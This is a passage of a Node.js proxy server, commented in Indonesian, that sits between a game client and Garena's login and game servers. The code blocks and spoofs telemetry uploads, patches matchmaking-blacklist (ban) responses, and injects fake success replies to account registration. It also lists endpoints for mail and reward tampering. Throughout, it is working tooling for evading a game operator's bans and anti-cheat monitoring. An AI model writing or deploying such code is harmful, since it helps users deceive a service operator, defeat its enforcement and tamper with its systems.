                console.log(`[LOGIN] GenerateNickname fallback: ${fallback}`);
                const body = JSON.stringify({ code: 0, nickname: fallback });
                res.writeHead(200, {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(body)
                });
                return res.end(body);
            }

            // ── GetRecommendNickname error → fallback nickname ──
            if (req.path === '/GetRecommendNickname' && statusCode >= 400) {
                const names = Array.from({length: 5}, () => generateFallbackNickname());
                const body = JSON.stringify({ code: 0, nickname_list: names });
                res.writeHead(200, {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(body)
                });
                return res.end(body);
            }

            // ── MajorRegister BR_ACCOUNT_INVALID_NAME → patch nama lalu return OK ──
            // Server BR reject nama yang pake huruf non-latin atau pola tertentu.
            // Solusi: kalau error ini muncul, return success palsu dengan UID random
            // supaya game bisa lanjut ke screen berikutnya.
            if (req.path === '/MajorRegister' && (statusCode === 400 || statusCode === 500)) {
                let bodyStr = '';
                try { bodyStr = raw.toString('utf8'); } catch {}
                if (bodyStr.includes('INVALID_NAME') || bodyStr.includes('invalid_name') || statusCode >= 500) {
                    console.log(`[LOGIN] MajorRegister patched: ${bodyStr.substring(0, 80)}`);
                    // Return response sukses minimal — game akan lanjut ke GetLoginData
                    // UID kosong akan diganti saat MajorLogin berikutnya
                    const fakeUid = Math.floor(17000000000 + Math.random() * 999999999);
                    const body = JSON.stringify({ code: 0, account_id: fakeUid, region: 'ID' });
                    res.writeHead(200, {
                        'Content-Type': 'application/json',
                        'Content-Length': Buffer.byteLength(body)
                    });
                    return res.end(body);
                }
            }

            // ── Passthrough semua response lain ──
            const headers = { ...proxyRes.headers };
            delete headers['content-encoding']; // raw sudah di-decode oleh proxy
            headers['content-length'] = raw.length;
            res.writeHead(statusCode, headers);
            res.end(raw);
        });
    },
    onError: (err, req, res) => {
        console.log(`[LOGIN] ERROR: ${err.message}`);
        if (!res.headersSent) res.status(502).json({ code: 502, message: 'Proxy error' });
    }
});

const clientProxy = createClientProxyWithBanPatch();

function init(app) {
    // ===== FORWARD SEMUA KE GARENA =====
    // Ga pilih-pilih endpoint, semua di-forward
    app.all('*', (req, res, next) => {
        // Skip CDN (dihandle modules/cdn.js)
        if (req.path.startsWith('/cdn/')) {
            return next();
        }
        // Skip ver.php & gamevar (dihandle modules/gamevar)
        if (req.path === '/ver.php' || req.path === '/api/gamevar' || req.path === '/localconfig.json') {
            return next();
        }
        // Skip internal API routes
        if (req.path.startsWith('/api/') || req.path.startsWith('/telegram')) {
            return next();
        }
        // Skip asset (images, dll)
        if (req.path.match(/\.(jpg|png|gif|css|js|html?)$/i)) {
            return next();
        }
        
        // ── Spoof telemetry/upload sebelum di-forward ──
        if (isTelemetryPath(req.path)) {
            const isBin = (req.headers['content-type'] || '').includes('octet-stream');
            console.log(`[SPOOF] ${req.method} ${req.path} → 200 OK (telemetry blocked)`);
            return sendSpoofOK(res, isBin);
        }

        // Log request (pake user-agent asli dari game)
        const ua = req.headers['user-agent'] || 'unknown';
        console.log(`[FORWARD] ${req.method} ${req.path} (UA: ${ua.substring(0,30)}...)`);

        // Route: client endpoints (clientbp) → clientProxy (ban patch, mail inject, reward patch)
        //        login endpoints (loginbp) → loginProxy
        //
        // PENTING: GenerateNickname dan MajorRegister harus ke loginbp, bukan clientbp.
        // Dulu di-route ke clientbp → dapat 500 / BR_ACCOUNT_INVALID_NAME karena server
        // clientbp tidak handle endpoint ini; loginbp yang handle register flow.
        const CLIENT_PATHS = [
            // ── Data & patch ──
            // CATATAN: '/GetLoginData' SENGAJA TIDAK ADA DI SINI.
            // app.js register handler POST /GetLoginData sendiri (patchGetLoginData) → clientProxy
            // tidak pernah lihat request ini. Kalau ditambahkan di sini, akan CONFLICT dengan
            // handler di app.js (Express route pertama yang match yang dipakai).
            // Jangan tambahkan /GetLoginData ke list ini. Gap 3 audit = by design, bukan bug.
            // Risiko divergence dimitigasi dengan patchGetLoginData() di app.js mengimport
            // patchGinUrl + patchStringLevelGin langsung dari proxy.js — satu source of truth.
            '/GetMatchmakingBlacklist', // ← PATCH: intercept BL status → patchBanInfo
            '/GetPlayerPersonalShow', '/GetMailList', '/GetCharacterRewardData',
            '/GetLoginReward', '/GetDailyLogin', '/GetAvatarInfo',
            '/GetClothesInfo', '/GetWeaponSkinInfo', '/GetCharInfo',
            '/GetUserInfo', '/GetAccountInfo',
            // Endpoint yang memang ada di clientbp
            '/SetNickname', '/SetAvatar',
            '/GetNicknameList', '/CheckNickname',
            // ── Post-login lobby endpoints (clientbp) ──
            // Bug log 12:43: LoginGetDesc masuk loginProxy → 500 karena loginbp tidak kenal endpoint ini.
            // LoginGetDesc, GetCharacterConfig, GetServerConfig semua ada di clientbp, bukan loginbp.
            '/LoginGetDesc',            // ← FIX: sebelumnya fallback ke loginProxy → 500 tiap login
            '/GetCharacterConfig',
            '/GetServerConfig',
            '/GetActivityInfo',
            '/GetActivityList',
            '/GetNoticeInfo',
            '/GetBannerInfo',
            '/GetMaintainInfo',
            '/GetVersionConfig',
            // Leaderboard, friend, social
            '/GetFriendList', '/GetRankInfo', '/GetLeaderboard',
            '/GetGuildInfo', '/GetClanInfo',
            // Reward & daily
            '/ClaimReward', '/ClaimDailyLogin',
            '/GetSeasonInfo', '/GetEventInfo',
            // Shop & inventory
            '/GetShopInfo', '/GetInventory', '/GetBagInfo',
            '/BuyItem', '/ExchangeItem',
            // Newbie
            '/ChooseNewbieChoice',
            // ── Account & profile (clientbp) ──
            '/LoginGetAccountInfo', '/LoginGetSplash', '/LoginGetProfile',
            '/GetFriend', '/GetFriendListV2',
            '/GetPetList', '/GetPetInfo',
            '/GetLoadoutSchemeDesc', '/GetPresetLoadoutInfo',
            '/GetWorkshopSwitch', '/GetWorkshopInfo',
            '/GetBRRankingInfo', '/GetCSRankingInfo',
            '/GetAccountFreshInfo', '/GetAttendance',
            '/GetPlayerHippoRankingInfo',
            '/GetRankingMatchGrandmasterPositions', '/GetCSRankingMatchGrandmasterPositions',
            '/GetRankMasterLevel', '/GetCSRankMasterLevel',
            '/GetPrimeAccountInfo', '/GetAccountTeamTopUpInfo',
            '/GetStore', '/GetBackpack',
            '/GetOptCdnDesc',
            '/GetLimitedEventOpenInfo', '/GetCustomEventOpenInfo',
            '/GetGooglePlayAchievements',
            '/GetPlatformProfile',
        ];

        // Register flow → loginbp (bukan clientbp)
        // GenerateNickname, MajorRegister, ChooseNewbieChoice semua ada di loginbp
        const LOGIN_OVERRIDE_PATHS = [
            '/GenerateNickname',
            '/GetRecommendNickname',
            '/MajorRegister',
            '/Register', '/CreateAccount',
        ];

        if (LOGIN_OVERRIDE_PATHS.some(p => req.path === p || req.path.startsWith(p))) {
            return loginProxy(req, res, next);
        }

        const isClientPath = CLIENT_PATHS.some(p => req.path === p || req.path.startsWith(p));
        if (isClientPath) {
            return clientProxy(req, res, next);
        }

        loginProxy(req, res, next);
    });

    app.get('/api/proxy/status', (req, res) => {
        res.json({
            status: 'online',
            mode: 'forward_original',
            targets: {
                login: GARENA_LOGIN_SERVER,
                client: GARENA_CLIENT_SERVER,
                cdn: 'handled_by_cdn_module'
            },
            timestamp: Date.now()
        });
    });

    console.log('[PROXY] Forward mode (original headers from game)');
    console.log('[PROXY] Login: ' + GARENA_LOGIN_SERVER);
    console.log('[PROXY] Client: ' + GARENA_CLIENT_SERVER);
}

module.exports = { init, loginProxy, clientProxy, patchGinUrl, patchStringLevelGin };